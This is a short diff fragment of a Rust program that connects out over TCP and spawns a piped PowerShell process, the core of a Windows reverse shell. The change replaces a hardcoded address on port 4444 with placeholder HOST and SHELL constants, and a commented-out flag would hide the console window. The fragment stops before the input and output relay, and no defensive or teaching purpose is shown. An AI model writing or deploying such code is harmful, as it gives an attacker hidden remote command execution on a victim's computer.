@@ -4,10 +4,13 @@ use std::net::TcpStream;
 use std::process::{Command, Stdio};
 use std::thread::spawn;
 
-fn main() -> Result<(), std::io::Error> {
-    let mut stream = TcpStream::connect("82.66.110.97:4444")?;
+const HOST: &str = "host:port";
+const SHELL: &str = "powershell";
 
-    let child = Command::new("powershell")
+fn main() -> Result<(), std::io::Error> {
+    let mut stream = TcpStream::connect(HOST)?;
+
+    let child = Command::new(SHELL)
         // .creation_flags(0x08000000)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
